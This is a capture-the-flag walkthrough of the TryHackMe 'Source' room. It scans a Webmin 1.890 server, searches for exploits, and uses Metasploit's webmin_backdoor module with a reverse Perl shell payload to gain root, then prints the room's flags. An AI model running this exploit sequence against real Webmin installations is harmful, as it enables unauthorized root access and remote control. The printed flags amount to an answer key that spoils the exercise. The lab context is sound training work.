# Source

## Task 1 - Embark

```
export IP=10.10.170.30
```

### user.txt
Initial nmap scan reveals a web server running on port `10000/tcp`:

```bash
jeffrowell@kali:~/Documents/TryHackMe/Source$ nmap -sC -sV -T4 -oN nmap/initial $IP
Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-17 21:36 MDT
Nmap scan report for 10.10.170.30
Host is up (0.14s latency).
Not shown: 998 closed ports
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 b7:4c:d0:bd:e2:7b:1b:15:72:27:64:56:29:15:ea:23 (RSA)
|   256 b7:85:23:11:4f:44:fa:22:00:8e:40:77:5e:cf:28:7c (ECDSA)
|_  256 a9:fe:4b:82:bf:89:34:59:36:5b:ec:da:c2:d3:95:ce (ED25519)
10000/tcp open  http    MiniServ 1.890 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 45.77 seconds
```

From the scan we can see that the HTTP server is using Webmin running MiniServ v1.890. First thing to do is check `searchsploit` to see if there are any active exploits for this version. Looking for `webmin` we find a decent list of exploit script to try


```bash
jeffrowell@kali:~/Documents/TryHackMe/Source$ searchsploit webmin
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                             |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
DansGuardian Webmin Module 0.x - 'edit.cgi' Directory Traversal                                                                                                                                            | cgi/webapps/23535.txt
phpMyWebmin 1.0 - 'target' Remote File Inclusion                                                                                                                                                           | php/webapps/2462.txt
phpMyWebmin 1.0 - 'window.php' Remote File Inclusion                                                                                                                                                       | php/webapps/2451.txt
Webmin - Brute Force / Command Execution                                                                                                                                                                   | multiple/remote/705.pl
webmin 0.91 - Directory Traversal                                                                                                                                                                          | cgi/remote/21183.txt
Webmin 0.9x / Usermin 0.9x/1.0 - Access Session ID Spoofing                                                                                                                                                | linux/remote/22275.pl
Webmin 0.x - 'RPC' Privilege Escalation                                                                                                                                                                    | linux/remote/21765.pl
Webmin 0.x - Code Input Validation                                                                                                                                                                         | linux/local/21348.txt
Webmin 1.5 - Brute Force / Command Execution                                                                                                                                                               | multiple/remote/746.pl
Webmin 1.5 - Web Brute Force (CGI)                                                                                                                                                                         | multiple/remote/745.pl
Webmin 1.580 - '/file/show.cgi' Remote Command Execution (Metasploit)                                                                                                                                      | unix/remote/21851.rb
Webmin 1.850 - Multiple Vulnerabilities                                                                                                                                                                    | cgi/webapps/42989.txt
Webmin 1.900 - Remote Command Execution (Metasploit)                                                                                                                                                       | cgi/remote/46201.rb
Webmin 1.910 - 'Package Updates' Remote Command Execution (Metasploit)                                                                                                                                     | linux/remote/46984.rb
Webmin 1.920 - Remote Code Execution                                                                                                                                                                       | linux/webapps/47293.sh
Webmin 1.920 - Unauthenticated Remote Code Execution (Metasploit)                                                                                                                                          | linux/remote/47230.rb
Webmin 1.x - HTML Email Command Execution                                                                                                                                                                  | cgi/webapps/24574.txt
Webmin < 1.290 / Usermin < 1.220 - Arbitrary File Disclosure (Perl)                                                                                                                                        | multiple/remote/2017.pl
Webmin < 1.290 / Usermin < 1.220 - Arbitrary File Disclosure (PHP)                                                                                                                                         | multiple/remote/1997.php
Webmin < 1.920 - 'rpc.cgi' Remote Code Execution (Metasploit)                                                                                                                                              | linux/webapps/47330.rb
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```

We see there is a metasploit module `Webmin < 1.920 - 'rpc.cgi' Remote Code Execution (Metasploit)` that we can use to exploit the old version of Webmin running on the target. To fireup metasploit and exploit the box is very simple:


```bash
msf5 > search webmin

Matching Modules
================

   #  Name                                         Disclosure Date  Rank       Check  Description
   -  ----                                         ---------------  ----       -----  -----------
   0  auxiliary/admin/webmin/edit_html_fileaccess  2012-09-06       normal     No     Webmin edit_html.cgi file Parameter Traversal Arbitrary File Access
   1  auxiliary/admin/webmin/file_disclosure       2006-06-30       normal     No     Webmin File Disclosure
   2  exploit/linux/http/webmin_backdoor           2019-08-10       excellent  Yes    Webmin password_change.cgi Backdoor
   3  exploit/linux/http/webmin_packageup_rce      2019-05-16       excellent  Yes    Webmin Package Updates Remote Command Execution
   4  exploit/unix/webapp/webmin_show_cgi_exec     2012-09-06       excellent  Yes    Webmin /file/show.cgi Remote Command Execution
   5  exploit/unix/webapp/webmin_upload_exec       2019-01-17       excellent  Yes    Webmin Upload Authenticated RCE


Interact with a module by name or index, for example use 5 or use exploit/unix/webapp/webmin_upload_exec

msf5 > use exploit/linux/http/webmin_backdoor
[*] Using configured payload cmd/unix/reverse_perl
msf5 exploit(linux/http/webmin_backdoor) > set RHOSTS 10.10.170.30
RHOSTS => 10.10.170.30
msf5 exploit(linux/http/webmin_backdoor) > set LHOST 10.8.21.42
LHOST => 10.8.21.42
msf5 exploit(linux/http/webmin_backdoor) > set SSL true
[!] Changing the SSL option's value may require changing RPORT!
SSL => true
msf5 exploit(linux/http/webmin_backdoor) > exploit

[*] Started reverse TCP handler on 10.8.21.42:4444
[*] Configuring Automatic (Unix In-Memory) target
[*] Sending cmd/unix/reverse_perl command payload
[*] Command shell session 1 opened (10.8.21.42:4444 -> 10.10.170.30:32984) at 2020-07-17 22:03:01 -0600
id
uid=0(root) gid=0(root) groups=0(root)

ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc fq_codel state UP group default qlen 1000
    link/ether 02:dc:d2:42:4c:e6 brd ff:ff:ff:ff:ff:ff
    inet 10.10.170.30/16 brd 10.10.255.255 scope global dynamic eth0
       valid_lft 2866sec preferred_lft 2866sec
    inet6 fe80::dc:d2ff:fe42:4ce6/64 scope link
       valid_lft forever preferred_lft forever

ls /home
dark

ls /home/dark
user.txt
webmin_1.890_all.deb

cat /home/dark/user.txt
THM{SUPPLY_CHAIN_COMPROMISE}
```

### root.txt
```bash
ls /root
root.txt

cat /root/root.txt
THM{UPDATE_YOUR_INSTALL}
```
